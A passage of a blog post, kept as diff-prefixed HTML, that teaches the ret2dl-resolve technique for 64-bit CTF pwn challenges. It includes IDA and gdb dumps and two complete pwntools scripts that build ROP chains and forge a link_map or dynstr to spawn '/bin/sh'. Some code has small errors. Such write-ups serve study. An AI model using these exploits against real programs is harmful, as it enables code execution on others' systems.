+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400540</span> _read           proc near               ; CODE XREF: vuln+<span class="number">2F</span>↓p</span><br><span class="line">.plt:<span class="number">0000000000400540</span>                 jmp     cs:off_601030</span><br><span class="line">.plt:<span class="number">0000000000400540</span> _read           endp</span><br><span class="line">.plt:<span class="number">0000000000400540</span></span><br><span class="line">.plt:<span class="number">0000000000400546</span> ; ---------------------------------------------------------------------------c</span><br><span class="line">.plt:<span class="number">0000000000400546</span>                 push    <span class="number">3</span></span><br><span class="line">.plt:<span class="number">000000000040054B</span>                 jmp     sub_400500   this place</span><br><span class="line">.plt:<span class="number">000000000040054B</span> ; &#125; <span class="comment">// starts at 400500</span></span><br><span class="line">.plt:<span class="number">000000000040054B</span> _plt</span><br></pre></td></tr></table></figure>
+
+<p>This involves the binding knowledge of a lazy binding</p>
+<p>To directly adopt the words of Master Kotor’s master is:</p>
+<p>When the library function is called for the first time, the program will first go to his plt table, push the second parameter <code>reloc_offset</code> of <code>_dl_runtime_resolve</code>, at this time the got table stores the next jump from his own plt table A statement, jump to the public plt[0], push the first parameter <code>link_map</code>, and finally call <code>_dl_runtime_resolve</code> to write the redirected address into the got table</p>
+<p><img src="https://img.le1a.com/2022/04/21/8cc3d5dd226a8.png" alt="1650544684766.png"></p>
+<p>This 0x8049030 is where we _dl_runtime_resolve (secretly took the picture of kot master, (escape)), then that’s ok, know this location, directly hijack the execution flow to this place when we finally return, and then hijack it again , we fill in a linkmap address we forged later, one is reloc_arg, here we are hijacking the linkmap, but we don’t need it, so it can be 0, and the construction can be started directly:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)  </span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#bss  </span></span><br><span class="line">bss = <span class="number">0x601050</span>  </span><br><span class="line">bss_addr = bss + <span class="number">0x100</span></span><br><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;write&#x27;</span>]  <span class="comment"># l_addr = -769472, 通常为负数</span></span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span>  </span><br><span class="line"><span class="comment">#pop rsi ; pop r15 ; ret  </span></span><br><span class="line">pop_rsi = <span class="number">0x4007a1</span>  </span><br><span class="line"><span class="comment">#用于解析符号dl_runtime_resolve  </span></span><br><span class="line">dl_re = <span class="number">0x400506</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">    <span class="comment"># &amp;(2**64-1)This is because the offset is usually a negative number. If you do not control the range, the p64 will go out of bounds and an error will occur.</span></span><br><span class="line">    linkmap=p64(offset &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># 1-- l_addr</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 2-- fake_linkmap_addr+0x8:  DT_JMPREL，Its structure refers to the .dynamic section</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x18</span>) <span class="comment"># Fake .rel.plt address</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 3-- fake_linkmap_addr+0x18</span></span><br><span class="line">    linkmap+=p64((fake_linkmap_addr+<span class="number">0x30</span>-offset)&amp;(<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)) <span class="comment"># r_offset: The address on the got table, it is not used, it can be set to a readable and writable address</span></span><br><span class="line">    linkmap+=p64(<span class="number">0x7</span>) <span class="comment"># r_info: 0x7 &gt;&gt; 32 = 0, Corresponding to index 0 of the sym table, the first item</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># r_addend: any value</span></span><br><span class="line"> </span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># l_ns</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 4-- fake_linkmap_addr+0x38: DT_SYMTAB</span></span><br><span class="line">    linkmap+=p64(<span class="number">0</span>) <span class="comment"># any value</span></span><br><span class="line">    linkmap+=p64(known_func_ptr-<span class="number">0x8</span>) <span class="comment"># Point to the first address of the sym table, indirectly make st_value = known_func_ptr</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fake_linkmap_addr+0x48</span></span><br><span class="line">    linkmap+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0x68</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr) <span class="comment"># Set the address where DT_STRTAB is located</span></span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x38</span>) <span class="comment"># 0x70 Set the address where DT_SYMTAB is located</span></span><br><span class="line">    linkmap=linkmap.ljust(<span class="number">0xf8</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    linkmap+=p64(fake_linkmap_addr+<span class="number">0x8</span>) <span class="comment">#Set the address where DT_JMPREL is located: any readable area can be</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_addr, write_got ,l_addr)<span class="comment"># 伪造link_map</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(read_plt)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)\+p64(pop_rdi)+p64(bss_addr+<span class="number">0x48</span>)+p64(dl_re)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">gdb.attach(r,<span class="string">&#x27;dir /home/roo/Desktop/ret2dl/glibc-2.31/elf&#x27;</span>)</span><br><span class="line">r.sendline(payload)  </span><br><span class="line">raw_input()</span><br><span class="line">r.send(fake_link_map) </span><br><span class="line"></span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure>
+
+<p>The above is just a brief introduction to the ret2dl of the program under PARTIAL_RELRO 64-bit. Of course, under 64-bit NO RELRO, the structure becomes very simple. Let’s briefly introduce it.</p>
+<p>NO RELRO</p>
+<p>This is a direct fake dynstr that is DT_STRTAB</p>
+<table>
+<thead>
+<tr>
+<th>name</th>
+<th>section name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DT_STRTAB</td>
+<td>.dynstr</td>
+</tr>
+<tr>
+<td>DT_SYMTAB</td>
+<td>.dynsym</td>
+</tr>
+<tr>
+<td>DT_JMPREL</td>
+<td>.rel.plt</td>
+</tr>
+</tbody></table>
+<p>see from ida</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0000000000400398</span> byte_400398     db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">00000000004002</span>D8↑o</span><br><span class="line">LOAD:<span class="number">0000000000400398</span>                                         ; LOAD:<span class="number">00000000004002F</span>0↑o ...</span><br><span class="line">LOAD:<span class="number">0000000000400399</span> aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0000000000400408</span>↓o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>A3 aStdin          db <span class="string">&#x27;stdin&#x27;</span>,<span class="number">0</span>            ; DATA XREF: LOAD:<span class="number">0000000000400380</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>A9 aStrlen         db <span class="string">&#x27;strlen&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">00000000004002F</span>0↑o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>0 aRead           db <span class="string">&#x27;read&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">0000000000400320</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>5 aStdout         db <span class="string">&#x27;stdout&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400368</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004003B</span>C aSetbuf         db <span class="string">&#x27;setbuf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">0000000000400308</span>↑o</span><br><span class="line">LOAD:<span class="number">00000000004003</span>C3 aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>Before that, we tampered with dynamic strtable into our fake dynstr</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000600E20</span> _DYNAMIC        Elf64_Dyn &lt;<span class="number">1</span>, <span class="number">1</span>&gt;        ; DATA XREF: LOAD:<span class="number">0000000000400130</span>↑o</span><br><span class="line">LOAD:<span class="number">0000000000600E20</span>                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:<span class="number">0000000000600E20</span>                                         ; DT_NEEDED libc.so<span class="number">.6</span></span><br><span class="line">LOAD:<span class="number">0000000000600E30</span>                 Elf64_Dyn &lt;<span class="number">0</span>Ch, <span class="number">4004E8</span>h&gt; ; DT_INIT</span><br><span class="line">LOAD:<span class="number">0000000000600E40</span>                 Elf64_Dyn &lt;<span class="number">0</span>Dh, <span class="number">4007B</span>4h&gt; ; DT_FINI</span><br><span class="line">LOAD:<span class="number">0000000000600E50</span>                 Elf64_Dyn &lt;<span class="number">19</span>h, <span class="number">600E10</span>h&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:<span class="number">0000000000600E60</span>                 Elf64_Dyn &lt;<span class="number">1B</span>h, <span class="number">8</span>&gt;      ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0000000000600E70</span>                 Elf64_Dyn &lt;<span class="number">1</span>Ah, <span class="number">600E18</span>h&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:<span class="number">0000000000600E80</span>                 Elf64_Dyn &lt;<span class="number">1</span>Ch, <span class="number">8</span>&gt;      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0000000000600E90</span>                 Elf64_Dyn &lt;<span class="number">6F</span>FFFEF5h, <span class="number">400298</span>h&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EA0                 Elf64_Dyn &lt;<span class="number">5</span>, <span class="number">400398</span>h&gt;  ; DT_STRTAB   I see here that it points directly to dynstr, and tampered with it to where we forged</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EB0                 Elf64_Dyn &lt;<span class="number">6</span>, <span class="number">4002</span>C0h&gt;  ; DT_SYMTAB</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EC0                 Elf64_Dyn &lt;<span class="number">0</span>Ah, <span class="number">5</span>Eh&gt;    ; DT_STRSZ</span><br><span class="line">LOAD:<span class="number">0000000000600</span>ED0                 Elf64_Dyn &lt;<span class="number">0B</span>h, <span class="number">18</span>h&gt;    ; DT_SYMENT</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EE0                 Elf64_Dyn &lt;<span class="number">15</span>h, <span class="number">0</span>&gt;      ; DT_DEBUG</span><br><span class="line">LOAD:<span class="number">0000000000600</span>EF0                 Elf64_Dyn &lt;<span class="number">3</span>, <span class="number">601000</span>h&gt;  ; DT_PLTGOT</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>00                 Elf64_Dyn &lt;<span class="number">2</span>, <span class="number">60</span>h&gt;      ; DT_PLTRELSZ</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>10                 Elf64_Dyn &lt;<span class="number">14</span>h, <span class="number">7</span>&gt;      ; DT_PLTREL</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>20                 Elf64_Dyn &lt;<span class="number">17</span>h, <span class="number">400488</span>h&gt; ; DT_JMPRELc</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>30                 Elf64_Dyn &lt;<span class="number">7</span>, <span class="number">400428</span>h&gt;  ; DT_RELA</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>40                 Elf64_Dyn &lt;<span class="number">8</span>, <span class="number">60</span>h&gt;      ; DT_RELASZ</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>50                 Elf64_Dyn &lt;<span class="number">9</span>, <span class="number">18</span>h&gt;      ; DT_RELAENT</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>60                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFFEh, <span class="number">400408</span>h&gt; ; DT_VERNEED</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>70                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFFFh, <span class="number">1</span>&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>80                 Elf64_Dyn &lt;<span class="number">6F</span>FFFFF0h, <span class="number">4003F</span>6h&gt; ; DT_VERSYM</span><br><span class="line">LOAD:<span class="number">0000000000600F</span>90                 Elf64_Dyn &lt;<span class="number">0</span>&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>
+
+<p>Finally, let’s look at the most important functions, the source code:</p>
+<p>strtab + sym-&gt;st_name this time is pointing to our system, where we just tampered with strlen as system</p>
+<p>Debugging is too complicated, many macro definitions, mainly as follows, directly complete the hijacking</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">  <span class="number">0x7f3ab197ac57</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">151</span>&gt;    mov    rdi, qword ptr [rsp + <span class="number">0x20</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac5c</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">156</span>&gt;    mov    rsi, qword ptr [rcsp + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac61</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">161</span>&gt;    mov    rdx, qword ptr [rsp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac66</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">166</span>&gt;    mov    rcx, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line">  <span class="number">0x7f3ab197ac6b</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">171</span>&gt;    mov    rax, qword ptr [rsp]</span><br><span class="line">► <span class="number">0x7f3ab197ac6f</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">175</span>&gt;    mov    rsp, rbx</span><br><span class="line">  <span class="number">0x7f3ab197ac72</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">178</span>&gt;    mov    rbx, qword ptr [rsp]</span><br><span class="line">  <span class="number">0x7f3ab197ac76</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">182</span>&gt;    add    rsp, <span class="number">0x18</span></span><br><span class="line">  <span class="number">0x7f3ab197ac7a</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">186</span>&gt;    bnd jmp r11</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Directly use the script of the online master as a template:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line"><span class="comment">#The target of our attack, the address of strtab in .dynamic, we have to modify it here to point to fake_dynstr</span></span><br><span class="line">target_addr = <span class="number">0x600988</span> + <span class="number">8</span>  </span><br><span class="line"><span class="comment">#The function used to load the function address, when we fake dynstr, call it again to load the function we need</span></span><br><span class="line">plt0_load = <span class="number">0x4004D0</span>   </span><br><span class="line"><span class="comment">#pop rdi;ret;  </span></span><br><span class="line">pop_rdi = <span class="number">0x400773</span> </span><br><span class="line"><span class="comment">#pop rsi ; pop r15 ; ret  </span></span><br><span class="line">pop_rsi = <span class="number">0x400771</span></span><br><span class="line"><span class="comment">#伪造dynstr  </span></span><br><span class="line">fake_dynstr = <span class="string">&#x27;\x00libc.so.6\x00stdin\x00system\x00&#x27;</span> <span class="comment">#原本dynstr为\x00libc.so.6\x00stdin\x00strlen\x00&#x27;</span></span><br><span class="line">bss = <span class="number">0x600B30</span>  </span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span> * <span class="number">120</span> , pop_rdi , <span class="number">0</span> , pop_rsi , bss , <span class="number">0</span> , read_plt , <span class="comment"># Write &#x27;/bin/sh&#x27; and fake strtab to bss segment</span></span><br><span class="line">                pop_rdi , <span class="number">0</span> , pop_rsi , target_addr , <span class="number">0</span> , read_plt , <span class="comment"># Change the strtab address in .dynamic to the address of our fake strtab</span></span><br><span class="line">                pop_rdi , bss , plt0_load , <span class="number">1</span> <span class="comment"># Call .dl_fixup to parse the strlen function. Since we have replaced strlen with system in fake_strtab, the system function will be parsed</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">r.sendline(payload)  </span><br><span class="line"><span class="comment">#Send system parameters and fake strtab</span></span><br><span class="line">payload2 = <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>) + fake_dynstr  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line">r.sendline(payload2)  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#Modify the address of strtab in dynsym to the address of our forged dynstr</span></span><br><span class="line">r.sendline(p64(bss + <span class="number">0x10</span>))  </span><br><span class="line">r.interactive()  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="So-far-I-have-analyzed-the-ret2dl-of-the-64-bit-pwn-problem-If-there-is-still-time-I-will-analyze-the-32-bit-problem-I-think-32-bit-is-more-complicated-I-wrote-this-article-for-two-days"><a href="#So-far-I-have-analyzed-the-ret2dl-of-the-64-bit-pwn-problem-If-there-is-still-time-I-will-analyze-the-32-bit-problem-I-think-32-bit-is-more-complicated-I-wrote-this-article-for-two-days" class="headerlink" title="So far, I have analyzed the ret2dl of the 64-bit pwn problem. If there is still time, I will analyze the 32-bit problem. I think 32-bit is more complicated. I wrote this article for two days. ! ! !"></a>So far, I have analyzed the ret2dl of the 64-bit pwn problem. If there is still time, I will analyze the 32-bit problem. I think 32-bit is more complicated. I wrote this article for two days. ! ! !</h3>
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Mr. Jsjsj, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/pwn/" class="tag">#pwn</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/10/04/wp/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">2023 xxx比赛关于学弟给的Rev wp</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/10/03/create-website/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">create_website</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="MrWillCom/MrWillCom.github.io" data-repo-id="MDEwOlJlcG9zaXRvcnkyODg5NTc5MTA=" data-category="Announcements" data-category-id="DIC_kwDOETkl1s4COQZm" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/projects" class="item">Projects</a>
+                
+                <a href="/resume" class="item">Resume</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/jsjsj1" class="item">GitHub</a>
+                
+                <a href="904815041@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Mr. Jsjsj<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+         
+        
+<script src="//code.tidio.co/6bkvqlfpdbtihnufei8yxpsvf98bq5gv.js"></script>
+ 
+        
+<script src="/js/tidio.js"></script>
+
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
